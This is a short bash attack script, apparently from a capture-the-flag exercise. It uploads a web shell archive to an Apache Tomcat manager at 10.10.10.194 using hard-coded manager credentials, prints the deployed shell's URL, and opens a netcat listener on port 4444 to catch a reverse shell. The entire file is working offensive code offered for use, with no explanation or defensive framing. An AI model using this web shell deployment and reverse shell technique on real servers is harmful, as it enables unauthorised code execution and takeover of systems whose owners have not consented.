#!/bin/bash

curl -v -u tomcat:'$3cureP4s5w0rd123!' -T webshell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true'
echo "http://10.10.10.194:8080/webshell"
nc -lvp 4444